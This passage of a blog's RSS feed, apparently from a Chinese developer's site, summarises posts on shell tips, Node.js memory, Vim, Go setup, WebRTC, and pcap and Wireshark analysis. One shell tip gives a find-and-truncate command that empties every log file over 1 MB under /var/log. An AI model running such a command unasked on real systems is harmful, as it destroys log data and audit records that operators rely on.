# 可以用#来替代/ sed &amp;#39;s#ABC#de/#g&amp;#39; some.</description>
    </item>
    
    <item>
      <title>Ack 在contab中无法查到关键词</title>
      <link>https://wdd.js.org/shell/contab-ack/</link>
      <pubDate>Fri, 18 Jun 2021 00:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/contab-ack/</guid>
      <description>手工执行，可以获得预期结果，但是在crontab中，却查不到结果。
stage_count=$(ack -h &amp;#34;\- name:&amp;#34; -t yaml | wc -l) 最终使用--nofilter参数，解决了问题。
stage_count=$(ack --nofilter -h &amp;#34;\- name:&amp;#34; -t yaml | wc -l) 参考
https://stackoverflow.com/questions/55777520/ack-fails-in-cronjob-but-runs-fine-from-commandline </description>
    </item>
    
    <item>
      <title>Js 101 Question</title>
      <link>https://wdd.js.org/fe/js-101-question/</link>
      <pubDate>Wed, 02 Jun 2021 13:44:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/js-101-question/</guid>
      <description>const a = {} function test1 (a) { a = { name: &amp;#39;wdd&amp;#39; } } function test2 () { test1(a) } function test3 () { console.log(a) } test2() test3() </description>
    </item>
    
    <item>
      <title>Perf Test Express Fastify</title>
      <link>https://wdd.js.org/fe/perf-test-express-fastify/</link>
      <pubDate>Mon, 31 May 2021 13:28:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/perf-test-express-fastify/</guid>
      <description>机器信息：4C32G 测试工具：wrk Node: v14.17.0
express.js
&amp;#39;use strict&amp;#39; const express = require(&amp;#39;express&amp;#39;) const app = express() app.get(&amp;#39;/&amp;#39;, function (req, res) { res.json({ hello: &amp;#39;world&amp;#39; }) }) app.listen(3000) fastify.js
&amp;#39;use strict&amp;#39; const fastify = require(&amp;#39;fastify&amp;#39;)() fastify.get(&amp;#39;/&amp;#39;, function (req, reply) { reply.send({ hello: &amp;#39;world&amp;#39; }) }) fastify.listen(3000) ~ 测试结果 # express.js Running 10s test @ http://127.0.0.1:3000 12 threads and 400 connections Thread Stats Avg Stdev Max +/- Stdev Latency 55.36ms 11.53ms 173.22ms 93.16% Req/Sec 602.</description>
    </item>
    
    <item>
      <title>Fatal process OOM in insufficient memory to create an Isolate</title>
      <link>https://wdd.js.org/fe/oom-in-insufficient-memory/</link>
      <pubDate>Fri, 21 May 2021 12:01:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/oom-in-insufficient-memory/</guid>
      <description>环境： ARM64
&amp;lt;--- Last few GCs ---&amp;gt; &amp;lt;--- JS stacktrace ---&amp;gt; # # Fatal process OOM in insufficient memory to create an Isolate # 在Dockerfile上设置max-old-space-size的node.js启动参数， 亲测有效。
CMD node --report-on-fatalerror --max-old-space-size=1536 dist/index.js Currently, by default v8 has a memory limit of 512mb on 32-bit and 1gb on 64-bit systems. You can raise the limit by setting &amp;ndash;max-old-space-size to a maximum of ~1gb for 32-bit and ~1.7gb for 64-bit systems. But it is recommended to split your single process into several workers if you are hitting memory limits.</description>
    </item>
    
    <item>
      <title>让你放弃VIM的一些原因</title>
      <link>https://wdd.js.org/vim/why-you-leave-vim/</link>
      <pubDate>Tue, 18 May 2021 11:30:22 +0800</pubDate>
      
      <guid>https://wdd.js.org/vim/why-you-leave-vim/</guid>
      <description>我只使用VIM作为主力开发工具，已经快到200天了。聊聊这其中的一些感受。
对大部分来说，提到文本编辑器，我们可能会想到word, nodepad++, webstorm, sublime, vscode。
这些GUI工具在给我们提供便利性的同时，也在逐渐固化我们对于编辑器的认知与思维方式。
闭上眼睛，提到编辑器，你脑海里想到的界面是什么呢？
左边一个文件浏览窗口 右边一个多标签页的文件编辑窗口 陌生感 想象一下，我们在使用编辑器的时候，哪些动作做的最多
鼠标移动到文件浏览窗口，通过滚轮的滚动，来选择文件，单击之后，打开一个文件。但是在VIM上，完全没有这种操作。 GUI下可以同时打开多个文件，进行编辑。但是很多人觉得VIM只能打开一个文件，甚至想打开另一个文件的时候，先要退出VIM。即使打开了多个文件，也不知道这些文件要如何切换。 但是当你刚开始使用VIM的时候，可能并没有安装什么插件，这时候你会有以下的一些困惑
你用VIM打开一个文件后，怎么再打开一个文件呢？因为默认的VIM是没有文件浏览窗口的。你在GUI模式下养成的经验，在VIM上完全无法使用。你可能甚至不知道要怎么退出VIM。所有的一切都那么陌生。
虚无感 VIM一般都运行在终端之上，给人感觉云里雾里，虚无缥缈。而编辑器就不同了，你看到的文件夹，打开的文件，对你来说就像是身上穿的衣服，手里搬的砖。终端呢，黑乎乎的，没啥颜色与图标，看起来那么不切实际，仿佛是天边的云彩，千变万化，无法琢磨。
恐惧感 很多人可能做过那种梦，就是在梦里感觉自己在自由落体，然后惊醒。在你使用VIM的时候，可能也会有这种感觉。例如，一个文件我写了几百行了，万一ssh远程连接断了，或者说终端崩溃了，我写的文件会不会丢呢？为了安全起见，还是不用VIM吧。
挫折感 使用VIM的时候，你必然要经历过很多困难，这些困难让你感觉到挫折，失去了继续学习的欲望。内心的另外一个人可能会说，我只想安安静静地做一个写代码的美男子，为什么要折腾这毫无颜值、难用的VIM呢？</description>
    </item>
    
    <item>
      <title>离线安装nodejs</title>
      <link>https://wdd.js.org/fe/install-nodejs-offline/</link>
      <pubDate>Thu, 13 May 2021 09:43:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/install-nodejs-offline/</guid>
      <description>1. 选择安装包 访问 https://nodejs.org/en/download/ 选择Linux Binaries(x64) 2. 解压 下载后的文件是一个tar.xz的文件。
xz -d node-xxxx.tar.zx // 解压xz tar -xvf node-xxxx.tar // 拿出文件夹 解压后的目录如下，其中
➜ node-v14.17.0-linux-x64 ll total 600K drwxr-xr-x 2 wangdd staff 4.0K May 13 09:34 bin -rw-r--r-- 1 wangdd staff 469K May 12 02:14 CHANGELOG.md drwxr-xr-x 3 wangdd staff 4.0K May 13 09:34 include drwxr-xr-x 3 wangdd staff 4.0K May 13 09:34 lib -rw-r--r-- 1 wangdd staff 79K May 12 02:14 LICENSE -rw-r--r-- 1 wangdd staff 30K May 12 02:14 README.</description>
    </item>
    
    <item>
      <title>websocket tcp keepalive 机制调研</title>
      <link>https://wdd.js.org/network/pz06t2/</link>
      <pubDate>Wed, 17 Mar 2021 19:17:46 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/pz06t2/</guid>
      <description>测试目标服务器 http://www.websocket-test.com/， 该服务器使用的是未加密的ws协议。
打开这个页面，可以看到这个页面发起了连接到ws://121.40.165.18:8800/ 的websocket连接。
然后看下里面的消息，都是服务端向客户端发送的消息。
通过wireshark分析
单独的websocket也是能够看到服务端下发的消息的。
keepalive 要点关注 每隔大约45秒，客户端会像服务端发送一个keep alive包。服务端也会非常快的回复一个心跳包 </description>
    </item>
    
    <item>
      <title>tcpdump filters</title>
      <link>https://wdd.js.org/network/hhlfi1/</link>
      <pubDate>Fri, 04 Dec 2020 13:32:16 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/hhlfi1/</guid>
      <description>ethereal-tcpdump.pdf</description>
    </item>
    
    <item>
      <title>libpcap tutorial</title>
      <link>https://wdd.js.org/network/ivzphz/</link>
      <pubDate>Fri, 04 Dec 2020 13:31:32 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/ivzphz/</guid>
      <description>libpcap-tutorial.pdf</description>
    </item>
    
    <item>
      <title>tcpdump zine</title>
      <link>https://wdd.js.org/network/yscigi/</link>
      <pubDate>Fri, 04 Dec 2020 13:29:53 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/yscigi/</guid>
      <description>tcpdump-zine.pdf</description>
    </item>
    
    <item>
      <title>pcap抓包教程</title>
      <link>https://wdd.js.org/network/uq5cii/</link>
      <pubDate>Wed, 02 Dec 2020 13:27:13 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/uq5cii/</guid>
      <description>准备条件 有gcc编译器 安装libpcap包 1.c 试运行 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;pcap.h&amp;gt; int main(int argc, char *argv[]) { char *dev = argv[1]; printf(&amp;#34;Device: %s\n&amp;#34;, dev); return(0); } gcc ./1.c -o 1.exe -lpcap demo-libpcap git:(master) ✗ ./1.exe eth0 Device: eth0 第一个栗子非常简单，仅仅是测试相关的库是否加载正确
2.c 获取默认网卡名称 参考 http://www.tcpdump.org/pcap.html </description>
    </item>
    
    <item>
      <title>wireshark从pcap中提取语音文件</title>
      <link>https://wdd.js.org/network/zgftde/</link>
      <pubDate>Wed, 25 Nov 2020 10:34:52 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/zgftde/</guid>
      <description>使用tcpdump在服务端抓包，将抓包后的文件在wireshark中打开。
然后选择：Telephony - VoIP Calls，wireshark可以从抓包文件中提取出SIP呼叫列表。
呼叫列表页面 在呼叫列表页面，选择一条呼叫记录，点击Flow Sequence， 可以查看该呼叫的SIP时序图。点击Play Stream， 可以播放该条呼叫的声音。
RTPplay页面有播放按钮，点击播放可以听到通话声音。</description>
    </item>
    
    <item>
      <title>wireshark合并和按时间截取pcap文件</title>
      <link>https://wdd.js.org/network/kgrco2/</link>
      <pubDate>Wed, 25 Nov 2020 10:11:22 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/kgrco2/</guid>
      <description>tcpdump可以在抓包时，按照指定时间间隔或者按照指定的包大小，产生新的pcap文件。用wireshark分析这些包时，往往需要将这些包做合并或者分离操作。
mergecap 如果安装了Wireshark那么mergecap就会自动安装，可以使用它来合并多个pcap文件。
// 按照数据包中的时间顺序合并文件 mergecap -w output.pcap input1.pcap input2.pcap input3.pcap // 按照命令行中的输入数据包文件顺序合并文件 // 不加-a, 可能会导致SIP时序图重复的问题 mergecap -a -w output.pcap input1.pcap input2.pcap input3.pcap editcap 对于一个很大的pcap文件，按照时间范围分割出新的pcap包
editcap -A &amp;#39;2014-12-10 10:11:01&amp;#39; -B &amp;#39;2014-12-10 10:21:01&amp;#39; input.pcap output.pcap 参考 https://blog.csdn.net/qq_19004627/article/details/82287172 </description>
    </item>
    
    <item>
      <title>从VSCode切换到VIM</title>
      <link>https://wdd.js.org/vim/from-vscode-to-vim/</link>
      <pubDate>Wed, 11 Nov 2020 11:25:58 +0800</pubDate>
      
      <guid>https://wdd.js.org/vim/from-vscode-to-vim/</guid>
      <description>为了能够在所有环境达到一致且极致的编程体验。我已经准备了好长的时间，从vscode切换到vim上做开发。
我的切换计划分为多个阶段：
尝试：使用vim编辑单个文件 练习：在vscode上安装vim插件，用了一段时间，感觉很别扭。 徘徊：尝试使用vim作为开发，用了一段时间后，我发现开发速度相比于vim上很慢。特别是多文件编辑，文件创建。没有vscode编辑器的那种文件侧边栏，感觉写代码不太真实，云里雾里的感觉。然后我就又切换到vscode上开发。 精进：我一直认为我vim已经学的差不多了，但是用vim的时候，总是感觉使不上劲。我觉得我没有系统的学习vim。然后我就去找了vim方面的书籍《vim实用技巧》。这本书我看过第一遍，我觉得自己之前对vim的理解太过肤浅。然后我就找机会从书中学习的技巧练习写代码。这本书我看了不下于三遍，每次看都有收获。每每遇到困惑的地方，我就会随手去查查。然后做总结。 切换：从今年双十一，我开始使用vim做开发，直到今天，我一直都没有使用vscode, 并且我也把vscode卸载了。我之所以敢于卸载vscode, 是因为我觉得我在vim上开发的效率，已经高于vscode。 熟练运用vim之后，我发现在vim上切换文件，打开文件还是创建文件，速度非常快，完全不需要鼠标点击。
除了没有右边的代码预览视图，vim功能都有。而且我越用越觉得vim的netrw插件要比vscode左边栏的文件树窗口好用。
还有代码搜索，我使用了ack， 用这个命令搜索关键词，简直快的飞起。</description>
    </item>
    
    <item>
      <title>Golang初学者的问题</title>
      <link>https://wdd.js.org/golang/golang-start-faq/</link>
      <pubDate>Fri, 18 Sep 2020 21:22:25 +0800</pubDate>
      
      <guid>https://wdd.js.org/golang/golang-start-faq/</guid>
      <description>1. 如何安装go 本次安装环境是win10子系统 ubuntu 20.04
打开网站 https://golang.google.cn/dl/
选择合适的最新版的连接
cd mkdir download cd download wget https://golang.google.cn/dl/go1.16.3.linux-amd64.tar.gz tar -C /usr/local -xvf go1.16.3.linux-amd64.tar.gz 因为我用的是zsh 所以我在~/.zshrc中，将go的bin目录加入到PATH中 export PATH=$PATH:/usr/local/go/bin 保存.zshrc之后 source ~/.zshrc ➜ download go version go version go1.16.3 linux/amd64 2. go proxy设置 Go 1.13 及以上（推荐）
打开你的终端并执行
go env -w GO111MODULE=on go env -w GOPROXY=https://goproxy.cn,direct 3. go get 下载的文件在哪？ 检查 go env
GOPATH=&amp;#34;/Users/wangdd/go” /Users/wangdd/go/pkg/mod total 0 drwxr-xr-x 4 wangdd staff 128B Sep 14 09:17 cache drwxr-xr-x 8 wangdd staff 256B Sep 14 09:17 github.</description>
    </item>
    
    <item>
      <title>Nodejs诊断报告</title>
      <link>https://wdd.js.org/fe/nodejs-report/</link>
      <pubDate>Thu, 13 Aug 2020 11:25:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/nodejs-report/</guid>
      <description>在v11.7.0中加入实验性功能，诊断报告。诊断报告的输出是一个json文件，包括以下信息。
进程信息 操作系统信息 堆栈信息 内存资源使用 libuv状态 环境变量 共享库 诊断报告的原始信息 如何产生诊断报告 必需使用 &amp;ndash;experimental-report 来启用 process.report.writeReport() 来输出诊断报告 node --experimental-report --diagnostic-report-filename=YYYYMMDD.HHMMSS.PID.SEQUENCE#.txt --eval &amp;#34;process.report.writeReport(&amp;#39;report.json&amp;#39;)&amp;#34; Writing Node.js report to file: report.json Node.js report completed 用编辑器打开诊断报告，可以看到类似下面的内容。
如何从诊断报告中分析问题？ 诊断报告很长，不太好理解。IBM开发了report-toolkit工具，可以用来分析。 要求：node &amp;gt; 11.8.0
npm install report-toolkit --global 或者 yarn global add report-toolkit 查看帮助信息
rtk --help 自动出发报告 node --experimental-report \ --diagnostic-report-on-fatalerror \ --diagnostic-report-uncaught-exception \ index.js $ node –help grep report --experimental-report enable report generation 启用report功能 --diagnostic-report-on-fatalerror generate diagnostic report on fatal (internal) errors 产生报告当发生致命错误 --diagnostic-report-on-signal generate diagnostic report upon receiving signals 产生报告当收到信号 --diagnostic-report-signal=.</description>
    </item>
    
    <item>
      <title>Webrtc Notes</title>
      <link>https://wdd.js.org/fe/webrtc-notes/</link>
      <pubDate>Mon, 13 Jul 2020 10:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/webrtc-notes/</guid>
      <description>标准文档 WebRTC https://w3c.github.io/webrtc-pc/ MediaStream https://www.w3.org/TR/mediacapture-streams/ 实现接口 MediaStream: 获取媒体流，例如从用户的摄像机或者麦克风 RTCPeerConnection: 音频或者视频呼叫，以及加密和带宽管理 RTCDataChannel: 端到端的数据交互 WebRTC架构 架构图颜色标识说明：
紫色部分是Web开发者API层 蓝色实线部分是面向浏览器厂商的API层 蓝色虚线部分浏览器厂商可以自定义实现 WebRTC有三个模块：
Voice Engine（音频引擎） Voice Engine包含iSAC/iLBC Codec（音频编解码器，前者是针对宽带和超宽带，后者是针对窄带） NetEQ for voice（处理网络抖动和语音包丢失） Echo Canceler（回声消除器）/ Noise Reduction（噪声抑制） Video Engine（视频引擎） VP8 Codec（视频图像编解码器） Video jitter buffer（视频抖动缓冲器，处理视频抖动和视频信息包丢失） Image enhancements（图像质量增强） Transport SRTP（安全的实时传输协议，用以音视频流传输） Multiplexing（多路复用） P2P，STUN+TURN+ICE（用于NAT网络和防火墙穿越的） 除此之外，安全传输可能还会用到DTLS（数据报安全传输），用于加密传输和密钥协商 整个WebRTC通信是基于UDP的 WebRTC底层协议 WebRTC 核心的协议都是在右侧基于 UDP 基础上搭建起来的。
其中，ICE、STUN、TURN 用于内网穿透, 解决了获取与绑定外网映射地址，以及 keep alive 机制
DTLS 用于对传输内容进行加密，可以看做是 UDP 版的 TLS。由于 WebRTC 对安全比较重视，这一层是必须的。所有WebRTC组件都必须加密，并且其JavaScript API只能用于安全源（HTTPS或本地主机）。信令机制并不是由WebRTC标准定义的，所以您必须确保使用安全协议。 SRTP 与 SRTCP 是对媒体数据的封装与传输控制协议 SCTP 是流控制传输协议，提供类似 TCP 的特性，SCTP 可以基于 UDP 上构建，在 WebRTC 里是在 DTLS 协议之上 RTCPeerConnection 用来建立和维护端到端连接，并提供高效的音视频流传输 RTCDataChannel 用来支持端到端的任意二进制数据传输 WebRTC 协议栈解释</description>
    </item>
    
    <item>
      <title>exec user process caused no such file or diectory</title>
      <link>https://wdd.js.org/posts/2022/docker-exec-user-process/</link>
      <pubDate>Wed, 08 Jul 2020 00:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2022/docker-exec-user-process/</guid>
      <description>exec user process caused &amp;#34;no such file or diectory&amp;#34; 解决方案： 将镜像构建的 Dockerfile ENTRYPOINT [&amp;quot;/run.sh&amp;quot;] 改为下面的
ENTRYPOINT [&amp;#34;sh&amp;#34;,&amp;#34;/run.sh&amp;#34;] 其实就是加了个sh</description>
    </item>
    
    <item>
      <title>Nodejs Gc Times</title>
      <link>https://wdd.js.org/fe/nodejs-gc-times/</link>
      <pubDate>Fri, 12 Jun 2020 11:14:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/nodejs-gc-times/</guid>
      <description>GC释放时机 当HeapUsed接近最大堆内存时，出发GC释放。 下图是深夜，压力比较小的时候。 下图是上午工作时间
内存泄漏 OOM </description>
    </item>
    
    <item>
      <title>Nodejs Mem Usage</title>
      <link>https://wdd.js.org/fe/nodejs-mem-usage/</link>
      <pubDate>Wed, 10 Jun 2020 14:24:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/nodejs-mem-usage/</guid>
      <description>process.memoryUsage() { rss: 4935680, heapTotal: 1826816, heapUsed: 650472, external: 49879, arrayBuffers: 9386 } heapTotal 和 heapUsed指向V8&amp;rsquo;s 内存使用 external 指向 C++ 对象的内存使用， C++对象绑定js对象，并且由V8管理 rss, 实际占用内存，包括C++, js对象和代码三块的总计。使用 ps aux命令输出时，rss的值对应了RSS列的数值 node js 所有buffer占用的内存 heapTotal and heapUsed refer to V8&amp;rsquo;s memory usage. external refers to the memory usage of C++ objects bound to JavaScript objects managed by V8. rss, Resident Set Size, is the amount of space occupied in the main memory device (that is a subset of the total allocated memory) for the process, including all C++ and JavaScript objects and code.</description>
    </item>
    
    <item>
      <title>Nodejs Memory Model</title>
      <link>https://wdd.js.org/fe/nodejs-memory-model/</link>
      <pubDate>Wed, 10 Jun 2020 14:21:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/nodejs-memory-model/</guid>
      <description>v8内存模型 Code Segment: 代码被实际执行 Stack 本地变量 指向引用的变量 流程控制，例如函数 Heap V8负责管理 HeapTotal 堆的总大小 HeapUsed 实际使用的大小 Shallow size of an object: 对象自身占用的内存 Retained size of an object: 对象及其依赖对象删除后回释放的内存 </description>
    </item>
    
    <item>
      <title>设置变量默认值</title>
      <link>https://wdd.js.org/shell/default-var/</link>
      <pubDate>Wed, 03 Jun 2020 18:44:33 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/default-var/</guid>
      <description>用法 Parameter What does it do? ${VAR:-STRING} If VAR is empty or unset, use STRING as its value. ${VAR-STRING} If VAR is unset, use STRING as its value. ${VAR:=STRING} If VAR is empty or unset, set the value of VAR to STRING. ${VAR=STRING} If VAR is unset, set the value of VAR to STRING. ${VAR:+STRING} If VAR is not empty, use STRING as its value. ${VAR+STRING} If VAR is set, use STRING as its value.</description>
    </item>
    
    <item>
      <title>比较与测试</title>
      <link>https://wdd.js.org/shell/cond-test/</link>
      <pubDate>Mon, 11 May 2020 13:01:07 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/cond-test/</guid>
      <description>if # if if condition; then commands; fi # if else if if condition; then commands; elif condition; then commands; else commands; fi 简单版本的if测试
[ condtion ] &amp;amp;&amp;amp; action; [ conditio ] || action; 算数比较 [ $var -eq 0 ] #当var等于0 [ $var -ne 0 ] #当var不等于0 -gt 大于 -lt 小于 -ge 大于或等于 -le 小于或等于 使用-a, -o可以组合复杂的测试。
[ $var -ne 0 -a $var -gt 2 ] # -a相当于并且 [ $var -ne 0 -o $var -gt 2 ] # -o相当于或 文件比较 [ -f $file ] # 如果file是存在的文件路径或者文件名，则返回真 -f 测试文件路径或者文件是否存在 -x 测试文件是否可执行 -e 测试文件是否存在 -c 测试文件是否是字符设备 -b 测试文件是否是块设备 -w 测试文件是否可写 -r 测试文件是否可读 -L 测试文件是否是一个符号链接 字符串比较 字符串比较一定要用双中括号。</description>
    </item>
    
    <item>
      <title>网络拆包笔记</title>
      <link>https://wdd.js.org/network/gzskun/</link>
      <pubDate>Sun, 03 May 2020 10:59:10 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/gzskun/</guid>
      <description>介绍 之所以要写这篇文章，是因为我要从pcap格式的抓包文件中抽取出语音文件。之间虽然对tcp协议有不错的理解，但并没有写代码去真正的解包分析。
最近用Node.js尝试去pacp文件中成功提取出了语音文件。再次做个总结。
预备知识 字节序： 关于字节序，可以参考 https://www.ruanyifeng.com/blog/2016/11/byte-order.html。读取的时候，如果字节序设置错了，就会读出来一堆无法解析的内容 PCAP格式 下面是paap文件的格式。
开局是一个全局的头文件。后续跟着一系列的包头和包体。
Global Header格式 全局头由六个字段组成，加起来一共24个字节。
typedef struct pcap_hdr_s { guint32 magic_number; /* magic number */ guint16 version_major; /* major version number */ guint16 version_minor; /* minor version number */ gint32 thiszone; /* GMT to local correction */ guint32 sigfigs; /* accuracy of timestamps */ guint32 snaplen; /* max length of captured packets, in octets */ guint32 network; /* data link type */ } pcap_hdr_t; magic_number 魔术字符，32位无符号整型，一般是0xa1b2c3d4或者0xd4c3b2a1，前者表示字段要按照大端字节序来读取，后者表示字段要按照小段字节序来读取。 version_major 大版本号，16位无符号整形。一般是2 version_minor 小版本号，16位无符号整形。一般是4 thiszone 时区 sigfigs 实际时间戳 snaplen 捕获的最大的长度 network 数据链路层的类型。参考http://www.</description>
    </item>
    
    <item>
      <title>网络包的封装和分用</title>
      <link>https://wdd.js.org/network/mlepcg/</link>
      <pubDate>Wed, 11 Mar 2020 08:24:20 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/mlepcg/</guid>
      <description>图解包在TCP/IP各个协议栈的流动情况
点击查看【undefined】</description>
    </item>
    
    <item>
      <title>IP协议 Protocol</title>
      <link>https://wdd.js.org/network/ip-protocol/</link>
      <pubDate>Thu, 05 Mar 2020 12:48:10 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/ip-protocol/</guid>
      <description>IP协议格式 字段说明 Protocol 表示上层协议，也就是传输层是什么协议。
只需要看Decimal这列，常用的有6表示TCP, 17表示UDP, 50表示ESP。
用wireshark抓包的时候，也可以看到Protocol: UDP(17)
参考 https://tools.ietf.org/html/rfc791 https://tools.ietf.org/html/rfc790 https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers </description>
    </item>
    
    <item>
      <title>从飞机航线讲解网络分层</title>
      <link>https://wdd.js.org/network/ibhy8a/</link>
      <pubDate>Tue, 03 Mar 2020 13:48:27 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/ibhy8a/</guid>
      <description> </description>
    </item>
    
    <item>
      <title>Copy as CURL and Copy Response</title>
      <link>https://wdd.js.org/fe/copy-as-curl-and-copy-response/</link>
      <pubDate>Sun, 01 Mar 2020 19:48:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/copy-as-curl-and-copy-response/</guid>
      <description>网页上的报错，一般都会和HTTP请求出错有关。 在Chrome浏览器中，按F12或者command+option+i可以打开Dev tools，在网络面板中可以找到报错的的HTTP请求。
通过提交Copy as cURL 和 Copy response的内容，就会非常准确的把问题报告给开发。开发也会非常快速的定位问题。</description>
    </item>
    
    <item>
      <title>TIME_WAIT与持久连接</title>
      <link>https://wdd.js.org/network/sq4l53/</link>
      <pubDate>Wed, 15 Jan 2020 20:23:45 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/sq4l53/</guid>
      <description>在事务结束之后，仍然保持在打开状态的链接称为持久连接。非持久的链接会在每个事务结束之后就会关闭。
持久连接的好处 避免缓慢的链接建立阶段 避免慢启动的拥塞适应阶段 Keep-Alive 客户端发起请求，带有Connection: Keep-Alive头。客户端在响应头中回应Connection: Keep-Alive。则说明客户端同意持久连接。
如果客户端不同意持久连接，就会在响应头中返回Connection: Close
注意事项
即使服务端同意了持久连接，服务端也可以随时关闭连接 HTTP 1.0 协议，必须显式传递Connection: Keep-Alive，服务端才会激活持久连接 HTTP 1.1 协议，默认就是持久连接 在通信双方中，主动关闭连接的一方会进入TIME_WIAT状态，而被动关闭的一方则不会进入该状态。
TIME_WAIT连接太多 服务端太多的TIME_WAIT连接，则说明连接是服务端主动去关闭的。查看了响应头，内容也是Connection: Close。
我们知道，一般情况下TIME_WAIT状态的链接至少会持续60秒。也就是说该连接占用的内存至少在60秒内不会释放。
当连接太多时，就有可能产生out of memory的问题，而操作系统就会很有可能把这个进程给kill掉，进而导致服务不可用。</description>
    </item>
    
    <item>
      <title>漫话TCP TIME-WAIT状态【ing】</title>
      <link>https://wdd.js.org/network/yoc1k0/</link>
      <pubDate>Tue, 07 Jan 2020 22:48:37 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/yoc1k0/</guid>
      <description>在《tcp/ip详解卷一》中，有幅图介绍了TCP的状态迁移，TCP的状态转移并不简单，我们本次重点关注TIME_WAIT状态。
TIME-WAIT 主机1发起FIN关闭连接请求，主机2发送ACK确认，然后也发送FIN。主机1在收到FIN之后，想主机2发送了ACK。
在主机1发送ACK时，主机1就进入了TIME-WAIT状态。
主动发起关闭连接的一方会有TIME-WAIT状态 如果两方同时发起关闭连接请求，那么两方都会进入TIME-WAIT状态 TIME-WAIT的时长在 /proc/sys/net/ipv4/tcp_fin_timeout 中配置，一般是60s 为什么要有TIME-WAIT状态？ 太多TIME-WAIT链接是否意味有故障？ </description>
    </item>
    
    <item>
      <title>常用shell技巧</title>
      <link>https://wdd.js.org/shell/all-in-one/</link>
      <pubDate>Tue, 07 Jan 2020 00:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/all-in-one/</guid>
      <description>命令行编辑 向左移动光标	ctrl + b 向右移动光标	ctrl + f 移动光标到行尾	ctrl + e 移动光标到行首	ctrl + a 清除前面一个词	ctrl + w 清除光标到行首	ctrl + u 清除光标到行尾	ctrl + k 命令行搜索	ctrl + r 解压与压缩 1、压缩命令： 命令格式：
tar -zcvf 压缩文件名 .tar.gz 被压缩文件名 可先切换到当前目录下，压缩文件名和被压缩文件名都可加入路径。
2、解压缩命令： 命令格式：
tar -zxvf 压缩文件名.tar.gz 解压缩后的文件只能放在当前的目录。
crontab 每隔x秒执行一次 每隔5秒
* * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done 每隔15秒
* * * * * /bin/cmd -arg1 * * * * * sleep 15; /bin/cmd -arg1 * * * * * sleep 30; /bin/cmd -arg1 * * * * * sleep 45; /bin/cmd -arg1 awk从第二行开始读取 awk &amp;#39;NR&amp;gt;2{print $1}&amp;#39; 查找大文件，并清空文件内容 find /var/log -type f -size +1M -exec truncate --size 0 &amp;#39;{}&amp;#39; &amp;#39;;&amp;#39; switch case 语句 echo &amp;#39;Input a number between 1 to 4&amp;#39; echo &amp;#39;Your number is:\c&amp;#39; read aNum case $aNum in 1) echo &amp;#39;You select 1&amp;#39; ;; 2) echo &amp;#39;You select 2&amp;#39; ;; 3) echo &amp;#39;You select 3&amp;#39; ;; 4) echo &amp;#39;You select 4&amp;#39; ;; *) echo &amp;#39;You do not select a number between 1 to 4&amp;#39; ;; esac 以$开头的特殊变量 echo $$ # 进程pid echo $# # 收到的参数个数 echo $@ # 列表方式的参数 $1 $2 $3 echo $?</description>
    </item>
    
    <item>
      <title>手工安装oh-my-zsh</title>
      <link>https://wdd.js.org/shell/manu-install-ohmyzsh/</link>
      <pubDate>Fri, 27 Dec 2019 09:29:41 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/manu-install-ohmyzsh/</guid>
      <description>yum install zsh -y # github上的项目下载太慢，所以我就把项目克隆到gitee上，这样克隆速度就非常快 git clone https://gitee.com/nuannuande/oh-my-zsh.git ~/.oh-my-zsh # 这一步是可选的 cp ~/.zshrc ~/.zshrc.orig # 这一步是必须的 cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc # 改变默认的sh, 如果这一步报错，就再次输入 zsh chsh -s $(which zsh) </description>
    </item>
    
    <item>
      <title>m4读取环境变量</title>
      <link>https://wdd.js.org/shell/m4-env/</link>
      <pubDate>Fri, 27 Dec 2019 09:28:53 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/m4-env/</guid>
      <description>define(`CF_INNER_IP&amp;#39;, `esyscmd(`printf &amp;#34;$PWD&amp;#34;&amp;#39;)&amp;#39;) </description>
    </item>
    
    <item>
      <title>pure-bash-bible</title>
      <link>https://wdd.js.org/shell/pure-bash-bible/</link>
      <pubDate>Thu, 26 Dec 2019 13:46:31 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/pure-bash-bible/</guid>
      <description>字符串 字符串包含 Using a test:
if [[ $var == *sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;sub_string is in var.&amp;#34; fi # Inverse (substring not in string). if [[ $var != *sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;sub_string is not in var.&amp;#34; fi # This works for arrays too! if [[ ${arr[*]} == *sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;sub_string is in array.&amp;#34; fi Using a case statement:
case &amp;#34;$var&amp;#34; in *sub_string*) # Do stuff ;; *sub_string2*) # Do more stuff ;; *) # Else ;; esac 字符串开始 if [[ $var == sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;var starts with sub_string.</description>
    </item>
    
    <item>
